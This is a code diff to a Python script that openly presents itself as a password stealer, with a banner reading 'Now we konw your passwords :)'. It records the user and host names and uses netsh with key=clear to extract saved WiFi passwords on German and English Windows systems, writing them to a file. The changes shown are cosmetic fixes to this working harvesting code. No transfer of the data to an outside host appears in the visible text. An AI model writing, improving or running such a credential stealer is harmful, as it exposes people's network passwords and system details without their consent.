@@ -18,7 +18,7 @@ PWinFileAll.write("#############################################################
 PWinFileAll.write("Now we konw your passwords :)\n\n")
 PWinFileAll.write("Systeminformations:\n")
 PWinFileAll.write("Username:\t"+getpass.getuser()+"\n")
-PWinFileAll.write("Username:\t"+socket.gethostname()+"\n\n")
+PWinFileAll.write("Hostname:\t"+socket.gethostname()+"\n\n")
 PWinFileAll.write("####################################################################################################\n\n\n\n\n")
 
 PWinFileAll.write("####################################################################################################\n\n")
@@ -118,10 +118,9 @@ PWinFileAll.write("#############################################################
 PWinFileAll.write("Wifi Passwords:\n\n")
 PWinFileAll.write("####################################################################################################\n\n")
 
-
 # Deutsche Sprache
 data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp850').split('\n')
-wifis = [line.split(":")[1][1:-1] for line in data if  "Profil für alle Benutzer" in line]
+wifis = [line.split(":")[1][1:-1] for line in data if "Profil für alle Benutzer" in line]
 for wifi in wifis:
     results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('cp850').split('\n')
     results = [line.split(":")[1][1:-1] for line in results if 'Schlüsselinhalt' in line]
@@ -137,15 +136,17 @@ for wifi in wifis:
 
 # Englische Sprache
 data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp850').split('\n')
-wifis = [line.split(":")[1][1:-1] for line in data if  "All User Profile" in line]
+wifis = [line.split(":")[1][1:-1] for line in data if "All User Profile" in line]
 for wifi in wifis:
     results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('cp850').split('\n')
     results = [line.split(":")[1][1:-1] for line in results if 'Key Content' in line]
     try:
-        PWinFileAll.write(f'Name: {wifi}, Password: {results[0]}\n')
+        PWinFileAll.write(f'Name: {wifi}, Password: {results[0]}')
+        PWinFileAll.write("\n")
         print(f'Name: {wifi}, Password: {results[0]}')
     except IndexError:
         print(f'Name: {wifi}, Password: Cannot be read!')
         PWinFileAll.write(f'Name: {wifi}, Password: Cannot be read!')
+        PWinFileAll.write("\n")
 
 PWinFileAll.close()
